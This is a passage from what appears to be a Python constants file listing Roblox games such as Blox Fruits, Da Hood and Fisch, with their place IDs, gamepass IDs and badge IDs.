        MushroomCadet              = 'Mushroom Cadet',                  1749673718, 'Mushroom_Cadet'
        MushroomHotshot            = 'Mushroom Hotshot',                1749675237, 'Mushroom_Hotshot'
        MushroomAce                = 'Mushroom Ace',                    1749676247, 'Mushroom_Ace'
        MushroomMaster             = 'Mushroom Master',                 1749677419, 'Mushroom_Master'
        MushroomGrandmaster        = 'Mushroom Grandmaster',            2124426335, 'Mushroom_Grandmaster'
        BlueFlowerCadet            = 'Blue Flower Cadet',               1749679114, 'Blue_Flower_Cadet'
        BlueFlowerHotshot          = 'Blue Flower Hotshot',             1749680097, 'Blue_Flower_Hotshot'
        BlueFlowerAce              = 'Blue Flower Ace',                 1749680902, 'Blue_Flower_Ace'
        BlueFlowerMaster           = 'Blue Flower Master',              1749681692, 'Blue_Flower_Master'
        BlueFlowerGrandmaster      = 'Blue Flower Grandmaster',         2124426336, 'Blue_Flower_Grandmaster'
        CloverCadet                = 'Clover Cadet',                    1749684261, 'Clover_Cadet'
        CloverHotshot              = 'Clover Hotshot',                  1749685928, 'Clover_Hotshot'
        CloverAce                  = 'Clover Ace',                      1749686750, 'Clover_Ace'
        CloverMaster               = 'Clover Master',                   1749688211, 'Clover_Master'
        CloverGrandmaster          = 'Clover Grandmaster',              2124426337, 'Clover_Grandmaster'
        SpiderCadet                = 'Spider Cadet',                    1749770193, 'Spider_Cadet'
        SpiderHotshot              = 'Spider Hotshot',                  1749771674, 'Spider_Hotshot'
        SpiderAce                  = 'Spider Ace',                      1749772538, 'Spider_Ace'
        SpiderMaster               = 'Spider Master',                   1749773617, 'Spider_Master'
        SpiderGrandmaster          = 'Spider Grandmaster',              2124426338, 'Spider_Grandmaster'
        StrawberryCadet            = 'Strawberry Cadet',                1749775523, 'Strawberry_Cadet'
        StrawberryHotshot          = 'Strawberry Hotshot',              1749776451, 'Strawberry_Hotshot'
        StrawberryAce              = 'Strawberry Ace',                  1749777194, 'Strawberry_Ace'
        StrawberryMaster           = 'Strawberry Master',               1749779193, 'Strawberry_Master'
        StrawberryGrandmaster      = 'Strawberry Grandmaster',          2124426339, 'Strawberry_Grandmaster'
        BambooCadet                = 'Bamboo Cadet',                    1749780645, 'Bamboo_Cadet'
        BambooHotshot              = 'Bamboo Hotshot',                  1749781861, 'Bamboo_Hotshot'
        BambooAce                  = 'Bamboo Ace',                      1749782542, 'Bamboo_Ace'
        BambooMaster               = 'Bamboo Master',                   1749783500, 'Bamboo_Master'
        BambooGrandmaster          = 'Bamboo Grandmaster',              2124426340, 'Bamboo_Grandmaster'
        PineappleCadet             = 'Pineapple Cadet',                 1749784769, 'Pineapple_Cadet'
        PineappleHotshot           = 'Pineapple Hotshot',               1749786138, 'Pineapple_Hotshot'
        PineappleAce               = 'Pineapple Ace',                   1749787209, 'Pineapple_Ace'
        PineappleMaster            = 'Pineapple Master',                1749788323, 'Pineapple_Master'
        PineappleGrandmaster       = 'Pineapple Grandmaster',           2124426341, 'Pineapple_Grandmaster'
        PumpkinCadet               = 'Pumpkin Cadet',                   1749833884, 'Pumpkin_Cadet'
        PumpkinHotshot             = 'Pumpkin Hotshot',                 1749835166, 'Pumpkin_Hotshot'
        PumpkinAce                 = 'Pumpkin Ace',                     1749835972, 'Pumpkin_Ace'
        PumpkinMaster              = 'Pumpkin Master',                  1749836699, 'Pumpkin_Master'
        PumpkinGrandmaster         = 'Pumpkin Grandmaster',             2124426342, 'Pumpkin_Grandmaster'
        CactusCadet                = 'Cactus Cadet',                    1749838495, 'Cactus_Cadet'
        CactusHotshot              = 'Cactus Hotshot',                  1749839078, 'Cactus_Hotshot'
        CactusAce                  = 'Cactus Ace',                      1749840246, 'Cactus_Ace'
        CactusMaster               = 'Cactus Master',                   1749841052, 'Cactus_Master'
        CactusGrandmaster          = 'Cactus Grandmaster',              2124426343, 'Cactus_Grandmaster'
        RoseCadet                  = 'Rose Cadet',                      1749842402, 'Rose_Cadet'
        RoseHotshot                = 'Rose Hotshot',                    1749843985, 'Rose_Hotshot'
        RoseAce                    = 'Rose Ace',                        1749844635, 'Rose_Ace'
        RoseMaster                 = 'Rose Master',                     1749845555, 'Rose_Master'
        RoseGrandmaster            = 'Rose Grandmaster',                2124426344, 'Rose_Grandmaster'
        PineTreeCadet              = 'Pine Tree Cadet',                 1749846876, 'Pine_Tree_Cadet'
        PineTreeHotshot            = 'Pine Tree Hotshot',               1749847825, 'Pine_Tree_Hotshot'
        PineTreeAce                = 'Pine Tree Ace',                   1749848603, 'Pine_Tree_Ace'
        PineTreeMaster             = 'Pine Tree Master',                1749849756, 'Pine_Tree_Master'
        PineTreeGrandmaster        = 'Pine Tree Grandmaster',           2124426345, 'Pine_Tree_Grandmaster'
        QuestCadet                 = 'Quest Cadet',                     1873772794, 'Quest_Cadet'
        QuestHotshot               = 'Quest Hotshot',                   1873774367, 'Quest_Hotshot'
        QuestAce                   = 'Quest Ace',                       1873775257, 'Quest_Ace'
        QuestMaster                = 'Quest Master',                    1873779975, 'Quest_Master'
        StumpCadet                 = 'Stump Cadet',                     2124442929, 'Stump_Cadet'
        StumpHotshot               = 'Stump Hotshot',                   2124442930, 'Stump_Hotshot'
        StumpAce                   = 'Stump Ace',                       2124442931, 'Stump_Ace'
        StumpMaster                = 'Stump Master',                    2124442932, 'Stump_Master'
        StumpGrandmaster           = 'Stump Grandmaster',               2124442933, 'Stump_Grandmaster'
        PlaytimeCadet              = 'Playtime Cadet',                  2124443228, 'Playtime_Cadet'
        PlaytimeHotshot            = 'Playtime Hotshot',                2124443229, 'Playtime_Hotshot'
        PlaytimeAce                = 'Playtime Ace',                    2124443230, 'Playtime_Ace'
        PlaytimeMaster             = 'Playtime Master',                 2124443231, 'Playtime_Master'
        PlaytimeGrandmaster        = 'Playtime Grandmaster',            2124443232, 'Playtime_Grandmaster'
        # List Of Badges
        listOfBadges = [YouPlayedBeeSwarmSimulator, SwarmingEggOfTheHive, BeesmasBeeliever, BeesmasOverachiever, EggHunt2019, Million1Honey, Million10Honey, Million100Honey, Billion1Honey, Billion20Honey, Thousand500Goo, Million5Goo, Million50Goo, Million500Goo, Billion10Goo, Battle100Points, Thousand1BattlePoints, Thousand10BattlePoints, Thousand50BattlePoints, Million1BattlePoints, Ability2500Tokens, Thousand25AbilityTokens, Thousand100AbilityTokens, Million1AbilityTokens, Million10AbilityTokens, SunflowerCadet, SunflowerHotshot, SunflowerAce, SunflowerMaster, SunflowerGrandmaster, DandelionCadet, DandelionHotshot, DandelionAce, DandelionMaster, DandelionGrandmaster, MushroomCadet, MushroomHotshot, MushroomAce, MushroomMaster, MushroomGrandmaster, BlueFlowerCadet, BlueFlowerHotshot, BlueFlowerAce, BlueFlowerMaster, BlueFlowerGrandmaster, CloverCadet, CloverHotshot, CloverAce, CloverMaster, CloverGrandmaster, SpiderCadet, SpiderHotshot, SpiderAce, SpiderMaster, SpiderGrandmaster, StrawberryCadet, StrawberryHotshot, StrawberryAce, StrawberryMaster, StrawberryGrandmaster, BambooCadet, BambooHotshot, BambooAce, BambooMaster, BambooGrandmaster, PineappleCadet, PineappleHotshot, PineappleAce, PineappleMaster, PineappleGrandmaster, PumpkinCadet, PumpkinHotshot, PumpkinAce, PumpkinMaster, PumpkinGrandmaster, CactusCadet, CactusHotshot, CactusAce, CactusMaster, CactusGrandmaster, RoseCadet, RoseHotshot, RoseAce, RoseMaster, RoseGrandmaster, PineTreeCadet, PineTreeHotshot, PineTreeAce, PineTreeMaster, PineTreeGrandmaster, QuestCadet, QuestHotshot, QuestAce, QuestMaster, StumpCadet, StumpHotshot, StumpAce, StumpMaster, StumpGrandmaster, PlaytimeCadet, PlaytimeHotshot, PlaytimeAce, PlaytimeMaster, PlaytimeGrandmaster]

class BladeBall: # https://www.roblox.com/games/13772394625
    placeNames = 'Blade Ball', 'Blade_Ball', 'BB', 13772394625
    class Gamepasses:
        VIP         = 'VIP',          223367086,  'VIP'
        DoubleCoins = 'Double Coins', 226785981,  'Double_Coins'
        InstantSpin = 'Instant Spin', 229765926,  'Instant_Spin'
        TradingSign = 'Trading Sign', 895596060,  'Trading_Sign'
        RadiantVeil = 'Radiant Veil', 1203969437, 'Radiant_Veil'
        # List Of Gamepasses
        listOfGamepasses = [VIP, DoubleCoins, InstantSpin, TradingSign, RadiantVeil]
    class Badges:
        TheHatch = 'The Hatch', 3790278758533153, 'The_Hatch'
        # List Of Badges
        listOfBadges = [TheHatch]

class BloxFruits: # https://www.roblox.com/games/2753915549
    placeNames = 'Blox Fruits', 'Blox_Fruits', 'BF', 2753915549
    class Gamepasses:
        x2Money       = '2x Money',       6028662, '2x_Money'
        x2Mastery     = '2x Mastery',     6240746, '2x_Mastery'
        x2BossDrops   = '2x Boss Drops',  7578721, '2x_Boss_Drops'
        DarkBlade     = 'Dark Blade',     6028786, 'Dark_Blade'
        FastBoats     = 'Fast Boats',     6525589, 'Fast_Boats'
        FruitNotifier = 'Fruit Notifier', 6738811, 'Fruit_Notifier'
        # List Of Gamepasses
        listOfGamepasses = [x2Money, x2Mastery, x2BossDrops, DarkBlade, FastBoats, FruitNotifier]
    class Badges:
        SecondSea     = 'Second Sea', 2125253106, 'Second_Sea'
        ThirdSea      = 'Third Sea',  2125253113, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class BlueLockRivals: # https://www.roblox.com/games/18668065416
    placeNames = 'Blue Lock: Rivals', 'Blue_Lock_Rivals', 'BLR', 18668065416
    class Gamepasses:
        VIP                = 'VIP',                 952453152,  'VIP'
        AnimeEmotes        = 'Anime Emotes',        957906237,  'Anime_Emotes'
        ToxicEmotes        = 'Toxic Emotes',        958185291,  'Toxic_Emotes'
        SkipSpins          = 'Skip Spins',          965195377,  'Skip_Spins'
        AwakeningOutfits   = 'Awakening Outfits',   1034038790, 'Awakening_Outfits'
        GoalSound          = 'Goal Sound',          1045871823, 'Goal_Sound'
        AnkleBreakerSound  = 'Ankle Breaker Sound', 1046171023, 'Ankle_Breaker_Sound'
        PrivateServersPlus = 'Private Servers+',    1054209537, 'Private_Servers_Plus'
        Slot2              = 'Slot 2',              924321836,  'Slot_2'
        Slot3              = 'Slot 3',              924345504,  'Slot_3'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AnimeEmotes, ToxicEmotes, SkipSpins, AwakeningOutfits, GoalSound, AnkleBreakerSound, PrivateServersPlus, Slot2, Slot3]

class BubbleGumSimulatorINFINITY: # https://www.roblox.com/games/85896571713843
    placeNames = 'Bubble Gum Simulator INFINITY', 'Bubble_Gum_Simulator_INFINITY', 'BGSI', 85896571713843
    class Gamepasses:
        VIP             = 'VIP',               1110079647, 'VIP'
        InfinityGum     = 'Infinity Gum',      1109858215, 'Infinity_Gum'
        ExtraEquips     = 'Extra Equips',      1111553262, 'Extra_Equips'
        FastHatch       = 'Fast Hatch',        1111985110, 'Fast_Hatch'
        TripleHatch     = 'Triple Hatch',      1112014853, 'Triple_Hatch'
        DigitalStorage  = 'Digital Storage',   1109959879, 'Digital_Storage'
        DoubleLuck      = 'Double Luck',       1109987673, 'Double_Luck'
        DoubleCurrency  = 'Double Currency',   1169607896, 'Double_Currency'
        DoubleGems      = 'Double Gems',       1111001300, 'Double_Gems'
        DoubleFishingXP = 'Double Fishing XP', 1384697982, 'Double_Fishing_XP'
        AutoFishing     = 'Auto Fishing',      1384649993, 'Auto_Fishing'
        LuckyEnchants   = 'Lucky Enchants',    1404811119, 'Lucky_Enchants'
        # List Of Gamepasses
        listOfGamepasses = [VIP, InfinityGum, ExtraEquips, FastHatch, TripleHatch, DigitalStorage, DoubleLuck, DoubleCurrency, DoubleGems, DoubleFishingXP, AutoFishing, LuckyEnchants]
    class Badges:
        Welcome            = 'Welcome',                967619436348747,  'Welcome'
        Bubbler500         = 'Bubbler (500)',          542484307529882,  'Bubbler_500'
        Starter2500        = 'Starter (2500)',         1305120438687619, 'Starter_2500'
        Advanced25K        = 'Advanced (25K)',         470805405292091,  'Advanced_25K'
        Expert100K         = 'Expert (100K)',          3118039627796133, 'Expert_100K'
        ExtremeBubbler500K = 'Extreme Bubbler (500K)', 2718129323670663, 'Extreme_Bubbler_500K'
        EliteBubbler1M     = 'Elite Bubbler (1M)',     1596637791422828, 'Elite_Bubbler_1M'
        GumSpecialist10M   = 'Gum Specialist (10M)',   1504133711887303, 'Gum_Specialist_10M'
        BubbleGummer100M   = 'Bubble Gummer (100M)',   2113590115918140, 'Bubble_Gummer_100M'
        TheBestBubbler1B   = 'The Best Bubbler (1B)',  1138391338389053, 'The_Best_Bubbler_1B'
        BubbleKing5B       = 'Bubble King (5B)',       2893978931392677, 'Bubble_King_5B'
        Hatch100Eggs       = 'Hatch 100 Eggs',         3148356404260788, 'Hatch_100_Eggs'
        Hatch1000Eggs      = 'Hatch 1,000 Eggs',       1697379762708218, 'Hatch_1000_Eggs'
        Hatch10000Eggs     = 'Hatch 10,000 Eggs',      264494209383906,  'Hatch_10000_Eggs'
        Hatch100000Eggs    = 'Hatch 100,000 Eggs',     4447657895374809, 'Hatch_100000_Eggs'
        Hatch1000000Eggs   = 'Hatch 1,000,000 Eggs',   2118067099446539, 'Hatch_1000000_Eggs'
        # List Of Badges
        listOfBadges = [Welcome, Bubbler500, Starter2500, Advanced25K, Expert100K, ExtremeBubbler500K, EliteBubbler1M, GumSpecialist10M, BubbleGummer100M, TheBestBubbler1B, BubbleKing5B, Hatch100Eggs, Hatch1000Eggs, Hatch10000Eggs, Hatch100000Eggs, Hatch1000000Eggs]

class CreaturesofSonaria: # https://www.roblox.com/games/5233782396
    placeNames = 'Creatures of Sonaria', 'Creatures_of_Sonaria', 'CoS', 5233782396
    class Gamepasses:
        CorvuraxSpecies = 'Corvurax Species', 216724088, 'Corvurax_Species'
        # List Of Gamepasses
        listOfGamepasses = [CorvuraxSpecies]
    class Badges:
        CreaturesofSonariaTHEHATCH      = 'Creatures of Sonaria: THE HATCH',   3863179600038190, 'Creatures_of_Sonaria_THE_HATCH'
        BetaTester                      = 'Beta Tester',                       2124595590,       'Beta_Tester'
        BetaSupporter                   = 'Beta Supporter',                    2124595592,       'Beta_Supporter'
        Halloween2022                   = 'Halloween 2022',                    2129022315,       'Halloween_2022'
        Halloween2023                   = 'Halloween 2023',                    2153215846,       'Halloween_2023'
        Halloween2024                   = 'Halloween 2024',                    4462319084474111, 'Halloween_2024'
        Halloween2025                   = 'Halloween 2025',                    3260751634114528, 'Halloween_2025'
        Christmas2020                   = 'Christmas 2020',                    2124660417,       'Christmas_2020'
        Christmas2022                   = 'Christmas 2022',                    2129936623,       'Christmas_2022'
        Valentines2021                  = 'Valentines 2021',                   2124686302,       'Valentines_2021'
        Valentines2023                  = 'Valentines 2023',                   2140726547,       'Valentines_2023'
        Valentines2024                  = 'Valentines 2024',                   55658403086320,   'Valentines_2024'
        Valentines2025                  = 'Valentines 2025',                   8003417492984,    'Valentines_2025'
        Easter2023                      = 'Easter 2023',                       2143625119,       'Easter_2023'
        Easter2024                      = 'Easter 2024',                       1734098717984624, 'Easter_2024'
        Easter2025                      = 'Easter 2025',                       1675841494057005, 'Easter_2025'
        LandSeaSky2023                  = 'Land Sea Sky 2023',                 2145610041,       'Land_Sea_Sky_2023'
        LandSeaSky2024                  = 'Land Sea Sky 2024',                 2960167874826659, 'Land_Sea_Sky_2024'
        LandSeaSky2025                  = 'Land Sea Sky 2025',                 90884767978344,   'Land_Sea_Sky_2025'
        SummerParadise2023              = 'Summer Paradise 2023',              2149100257,       'Summer_Paradise_2023'
        SummerParadise2024              = 'Summer Paradise 2024',              1654242147814853, 'Summer_Paradise_2024'
        SummerParadise2025              = 'Summer Paradise 2025',              4135848726720838, 'Summer_Paradise_2025'
        Winter2023                      = 'Winter 2023',                       2661459542444321, 'Winter_2023'
        Winter2024                      = 'Winter 2024',                       2998142934210494, 'Winter_2024'
        SpringMeadows2024               = 'Spring Meadows 2024',               1040006371199126, 'Spring_Meadows_2024'
        SpringMeadows2025               = 'Spring Meadows 2025',               956526096696823,  'Spring_Meadows_2025'
        Disaster2024                    = 'Disaster 2024',                     1888520945881505, 'Disaster_2024'
        Disaster2025                    = 'Disaster 2025',                     3078297039018317, 'Disaster_2025'
        Lore2024                        = 'Lore 2024',                         4346068251661631, 'Lore_2024'
        Lore2025                        = 'Lore 2025',                         1365014430910710, 'Lore_2025'
        Harvest2024                     = 'Harvest 2024',                      1596996370838262, 'Harvest_2024'
        Amazon2024                      = 'Amazon 2024',                       2291949305789809, 'Amazon_2024'
        Fireworks2023                   = 'Fireworks 2023',                    2148143991,       'Fireworks_2023'
        Fireworks2024                   = 'Fireworks 2024',                    2566270751122609, 'Fireworks_2024'
        Fireworks2025                   = 'Fireworks 2025',                    1342436313329184, 'Fireworks_2025'
        TwentyOnePilotsEvent            = 'Twenty One Pilots Event',           2124810991,       'Twenty_One_Pilots_Event'
        RecodeEarlyAccess               = 'Recode Early Access',               2147582505,       'Recode_Early_Access'
        RecodeSupporterTitleAndCreature = 'Recode Supporter Title & Creature', 2147584013,       'Recode_Supporter_Title_And_Creature'
        TwinAtlasWinterClash            = 'Twin Atlas Winter Clash',           1964648519335747, 'Twin_Atlas_Winter_Clash'
        NINJAGOLegendsEvent             = 'NINJAGO Legends Event',             2521539978905021, 'NINJAGO_Legends_Event'
        MedalTVQuestCompletion          = 'MedalTV Quest Completion',          3536015251824551, 'MedalTV_Quest_Completion'
        MedalTVQuestCompletionWeek2     = 'MedalTV Quest Completion, Week 2',  3036475209269208, 'MedalTV_Quest_Completion_Week_2'
        # List Of Badges
        listOfBadges = [CreaturesofSonariaTHEHATCH, BetaTester, BetaSupporter, Halloween2022, Halloween2023, Halloween2024, Halloween2025, Christmas2020, Christmas2022, Valentines2021, Valentines2023, Valentines2024, Valentines2025, Easter2023, Easter2024, Easter2025, LandSeaSky2023, LandSeaSky2024, LandSeaSky2025, SummerParadise2023, SummerParadise2024, SummerParadise2025, Winter2023, Winter2024, SpringMeadows2024, SpringMeadows2025, Disaster2024, Disaster2025, Lore2024, Lore2025, Harvest2024, Amazon2024, Fireworks2023, Fireworks2024, Fireworks2025, TwentyOnePilotsEvent, RecodeEarlyAccess, RecodeSupporterTitleAndCreature, TwinAtlasWinterClash, NINJAGOLegendsEvent, MedalTVQuestCompletion, MedalTVQuestCompletionWeek2]

class DaHood: # https://www.roblox.com/games/2788229376
    placeNames = 'Da Hood', 'Da_Hood', 'DH', 2788229376
    class Gamepasses:
        Boombox               = 'Boombox',            6207330,    'Boombox'
        AnonymousCalls        = 'Anonymous Calls',    6072006,    'Anonymous_Calls'
        CustomRingtone        = 'Custom Ringtone',    6080836,    'Custom_Ringtone'
        AnimationPack         = 'Animation Pack',     6412475,    'Animation_Pack'
        AnimationPackPlusPlus = 'Animation Pack++',   106912041,  'Animation_PackPlusPlus'
        Flashlight            = 'Flashlight',         6673363,    'Flashlight'
        Knife                 = 'Knife',              6217663,    'Knife'
        Bat                   = 'Bat',                6407926,    'Bat'
        Shovel                = 'Shovel',             6813576,    'Shovel'
        Mask                  = 'Mask',               103232594,  'Mask'
        PepperSpray           = 'Pepper Spray',       6966816,    'Pepper_Spray'
        HouseLimitBoost       = 'House Limit Boost',  7130657,    'House_Limit_Boost'
        CustomCursor          = 'Custom Cursor',      106911810,  'Custom_Cursor'
        HairGlue              = 'Hair Glue',          916795141,  'Hair_Glue'
        VehicleLock           = 'Vehicle Lock',       1290098254, 'Vehicle_Lock'
        Undercoverofficer     = 'Undercover officer', 6394348,    'Undercover_officer'
        Pitchfork             = 'Pitchfork',          7232728,    'Pitchfork'
        Pencil                = 'Pencil',             79498592,   'Pencil'
        AimViewer             = 'Aim Viewer',         1133680367, 'Aim_Viewer'
        # List Of Gamepasses
        listOfGamepasses = [Boombox, AnonymousCalls, CustomRingtone, AnimationPack, AnimationPackPlusPlus, Flashlight, Knife, Bat, Shovel, Mask, PepperSpray, HouseLimitBoost, CustomCursor, HairGlue, VehicleLock, Undercoverofficer, Pitchfork, Pencil, AimViewer]

class DragonAdventures: # https://www.roblox.com/games/3475397644
    placeNames = 'Dragon Adventures', 'Dragon_Adventures', 'DA', 3475397644
    class Gamepasses:
        VIP              = 'VIP',               7010034,  'VIP'
        AdvancedBuilding = 'Advanced Building', 7578781,  'Advanced_Building'
        LuckyEgg         = 'Lucky Egg',         8510023,  'Lucky_Egg'
        ResourceHog      = 'Resource Hog',      8510024,  'Resource_Hog'
        BigBackpack      = 'Big Backpack',      8510025,  'Big_Backpack'
        LuckyTrainer     = 'Lucky Trainer',     8510026,  'Lucky_Trainer'
        LuckyTailor      = 'Lucky Tailor',      10999031, 'Lucky_Tailor'
        MultiRiding      = 'Multi-Riding',      9802010,  'Multi_Riding'
        MultiAccessory   = 'Multi-Accessory',   12000312, 'Multi_Accessory'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AdvancedBuilding, LuckyEgg, ResourceHog, BigBackpack, LuckyTrainer, LuckyTailor, MultiRiding, MultiAccessory]
    class Badges:
        MetaDeveloper   = 'Met a Developer!',    2124634392,       'Met_a_Developer'
        RiyusTrustBadge = 'Riyu\'s Trust Badge', 530731637639832,  'Riyus_Trust_Badge'
        Winter2019      = 'Winter 2019',         2124564089,       'Winter_2019'
        Winter2021      = 'Winter 2021',         2124879418,       'Winter_2021'
        Christmas2022   = 'Christmas 2022',      2129850167,       'Christmas_2022'
        Winter2023      = 'Winter 2023',         1724546607470910, 'Winter_2023'
        Winter2024      = 'Winter 2024',         1680929594185010, 'Winter_2024'
        Valentines2020  = 'Valentines 2020',     2124564091,       'Valentines_2020'
        Valentines2022  = 'Valentines 2022',     2124928448,       'Valentines_2022'
        Valentines2023  = 'Valentines 2023',     2140856200,       'Valentines_2023'
        Valentines2024  = 'Valentines 2024',     2897784583321876, 'Valentines_2024'
        Valentines2025  = 'Valentines 2025',     3543596453313423, 'Valentines_2025'
        Halloween2019   = 'Halloween 2019',      2124564088,       'Halloween_2019'
        Halloween2020   = 'Halloween 2020',      2124622292,       'Halloween_2020'
        Halloween2021   = 'Halloween 2021',      2124843641,       'Halloween_2021'
        Halloween2022   = 'Halloween 2022',      2129053839,       'Halloween_2022'
        Halloween2023   = 'Halloween 2023',      2153596435,       'Halloween_2023'
        Halloween2024   = 'Halloween 2024',      778861698160847,  'Halloween_2024'
        Halloween2025   = 'Halloween 2025',      795755868351989,  'Halloween_2025'
        Easter2020      = 'Easter 2020',         2124564092,       'Easter_2020'
        Easter2021      = 'Easter 2021',         2124706777,       'Easter_2021'
        Easter2022      = 'Easter 2022',         2125832921,       'Easter_2022'
        Easter2023      = 'Easter 2023',         2143031781,       'Easter_2023'
        Easter2024      = 'Easter 2024',         3467626479412502, 'Easter_2024'
        Easter2025      = 'Easter 2025',         1570550551506460, 'Easter_2025'
        Solstice2020    = 'Solstice 2020',       2124564093,       'Solstice_2020'
        Solstice2021    = 'Solstice 2021',       2124583228,       'Solstice_2021'
        Solstice2022    = 'Solstice 2022',       2128140324,       'Solstice_2022'
        Solstice2023    = 'Solstice 2023',       2150313169,       'Solstice_2023'
        Solstice2024    = 'Solstice 2024',       1575651999109337, 'Solstice_2024'
        Solstice2025    = 'Solstice 2025',       1460647362033186, 'Solstice_2025'
        Galaxy2022      = 'Galaxy 2022',         2126825175,       'Galaxy_2022'
        Galaxy2023      = 'Galaxy 2023',         2147481065,       'Galaxy_2023'
        Galaxy2024      = 'Galaxy 2024',         2412831398413312, 'Galaxy_2024'
        Galaxy2025      = 'Galaxy 2025',         3448916649511144, 'Galaxy_2025'
        # List Of Badges
        listOfBadges = [MetaDeveloper, RiyusTrustBadge, Winter2019, Winter2021, Christmas2022, Winter2023, Winter2024, Valentines2020, Valentines2022, Valentines2023, Valentines2024, Valentines2025, Halloween2019, Halloween2020, Halloween2021, Halloween2022, Halloween2023, Halloween2024, Halloween2025, Easter2020, Easter2021, Easter2022, Easter2023, Easter2024, Easter2025, Solstice2020, Solstice2021, Solstice2022, Solstice2023, Solstice2024, Solstice2025, Galaxy2022, Galaxy2023, Galaxy2024, Galaxy2025]

class Fisch: # https://www.roblox.com/games/16732694052
    placeNames = 'Fisch', 'Fisch', 'Fi', 16732694052
    class Gamepasses:
        Radio             = 'Radio',               948629114,  'Radio'
        Supporter         = 'Supporter',           837478377,  'Supporter'
        AppraisersLuck    = 'Appraisers Luck',     837341519,  'Appraisers_Luck'
        DoubleXP          = 'Double XP',           837360470,  'Double_XP'
        EmotePack         = 'Emote Pack',          847012516,  'Emote_Pack'
        BobberPack        = 'Bobber Pack',         927437431,  'Bobber_Pack'
        SellAnywhere      = 'Sell Anywhere',       901839344,  'Sell_Anywhere'
        SpawnBoatAnywhere = 'Spawn Boat Anywhere', 986687236,  'Spawn_Boat_Anywhere'
        AppraiseAnywhere  = 'Appraise Anywhere',   986882975,  'Appraise_Anywhere'
        AquariumBoat      = 'Aquarium Boat',       1202313985, 'Aquarium_Boat'
        # List Of Gamepasses
        listOfGamepasses = [Radio, Supporter, AppraisersLuck, DoubleXP, EmotePack, BobberPack, SellAnywhere, SpawnBoatAnywhere, AppraiseAnywhere, AquariumBoat]
    class Badges:
        FirstTimeFischer            = 'First Time Fischer',               3713345851024569, 'First_Time_Fischer'
        SpecialSomeone              = 'Special Someone',                  2548603185740666, 'Special_Someone'
        EconomyExpert               = 'Economy Expert',                   4227551957813448, 'Economy_Expert'
        RareHunter                  = 'Rare Hunter',                      398396161277206,  'Rare_Hunter'
        KeepersPupil                = 'Keepers Pupil',                    292081433761936,  'Keepers_Pupil'
        AttemptedUpgrade            = 'Attempted Upgrade',                2087500307302023, 'Attempted_Upgrade'
        DivineRelic                 = 'Divine Relic',                     4469874271658702, 'Divine_Relic'
        Catches50                   = '50 Catches',                       3051769055311800, '50_Catches'
        Catches100                  = '100 Catches',                      980568772269520,  '100_Catches'
        Catches500                  = '500 Catches',                      2392322242811007, '500_Catches'
        Catches1000                 = '1000 Catches',                     2121501969748139, '1000_Catches'
        Catches2000                 = '2000 Catches',                     4043528816128290, '2000_Catches'
        Catches3000                 = '3000 Catches',                     2237691197864883, '3000_Catches'
        Catches4000                 = '4000 Catches',                     2586667227808420, '4000_Catches'
        Catches5000                 = '5000 Catches',                     2440764735271938, '5000_Catches'
        Catches10000                = '10,000 Catches',                   1009279661183813, '10000_Catches'
        LavaCaster                  = 'Lava Caster',                      1708816354589502, 'Lava_Caster'
        ReconExpert                 = 'Recon Expert',                     3526079295826418, 'Recon_Expert'
        TruePower                   = 'True Power',                       163992758707317,  'True_Power'
        ExperiencedTrueBeauty       = 'Experienced True Beauty',          553555175646641,  'Experienced_True_Beauty'
        BestiaryOcean               = 'Bestiary: Ocean',                  1045860405568363, 'Bestiary_Ocean'
        BestiaryMoosewood           = 'Bestiary: Moosewood',              3871316346306270, 'Bestiary_Moosewood'
        BestiaryRoslit              = 'Bestiary: Roslit',                 225841574756551,  'Bestiary_Roslit'
        BestiarySunstoneIsland      = 'Bestiary: Sunstone Island',        2903347774735091, 'Bestiary_Sunstone_Island'
        BestiaryTerrapinIsland      = 'Bestiary: Terrapin Island',        2994442057572213, 'Bestiary_Terrapin_Island'
        BestiaryRoslitVolcano       = 'Bestiary: Roslit Volcano',         4479912445209985, 'Bestiary_Roslit_Volcano'
        BestiaryVertigo             = 'Bestiary: Vertigo',                3200076862852988, 'Bestiary_Vertigo'
        BestiaryMushgroveSwamp      = 'Bestiary: Mushgrove Swamp',        4343979385420841, 'Bestiary_Mushgrove_Swamp'
        BestiarySnowcap             = 'Bestiary: Snowcap',                4101868524305507, 'Bestiary_Snowcap'
        BestiaryEverything          = 'Bestiary: Everything',             635398639427099,  'Bestiary_Everything'
        BestiaryKeepersAltar        = 'Bestiary: Keepers Altar',          772547227400435,  'Bestiary_Keepers_Altar'
        BestiaryDesolateDeep        = 'Bestiary: Desolate Deep',          3161443122784523, 'Bestiary_Desolate_Deep'
        BestiaryBrinePool           = 'Bestiary: Brine Pool',             1535329670769985, 'Bestiary_Brine_Pool'
        BestiaryForsakenShores      = 'Bestiary: Forsaken Shores',        3591399443042848, 'Bestiary_Forsaken_Shores'
        BestiaryTheDepths           = 'Bestiary: The Depths',             2042505003241970, 'Bestiary_The_Depths'
        BestiaryAncientArchives     = 'Bestiary: Ancient Archives',       1666493813690822, 'Bestiary_Ancient_Archives'
        BestiaryAncientIsle         = 'Bestiary: Ancient Isle',           2054807830474099, 'Bestiary_Ancient_Isle'
        BestiaryOvergrowthCaves     = 'Bestiary: Overgrowth Caves',       272078520028439,  'Bestiary_Overgrowth_Caves'
        BestiaryFrigidCavern        = 'Bestiary: Frigid Cavern',          843774301770016,  'Bestiary_Frigid_Cavern'
        BestiaryCryogenicCanal      = 'Bestiary: Cryogenic Canal',        4189906956026791, 'Bestiary_Cryogenic_Canal'
        BestiaryGlacialGrotto       = 'Bestiary: Glacial Grotto',         1396071619017862, 'Bestiary_Glacial_Grotto'
        BestiaryGrandReef           = 'Bestiary: Grand Reef',             968483808853747,  'Bestiary_Grand_Reef'
        BestiaryAtlanteanStorm      = 'Bestiary: Atlantean Storm',        32642745294476,   'Bestiary_Atlantean_Storm'
        BestiaryAtlantis            = 'Bestiary: Atlantis',               2070428894950149, 'Bestiary_Atlantis'
        BestiaryVolcanicVents       = 'Bestiary: Volcanic Vents',         2971899933109154, 'Bestiary_Volcanic_Vents'
        BestiaryChallengersDeep     = 'Bestiary: Challengers Deep',       2580846320562382, 'Bestiary_Challengers_Deep'
        BestiaryAbyssalZenith       = 'Bestiary: Abyssal Zenith',         440171660675783,  'Bestiary_Abyssal_Zenith'
        BestiaryCalmZone            = 'Bestiary: Calm Zone',              699973517072777,  'Bestiary_Calm_Zone'
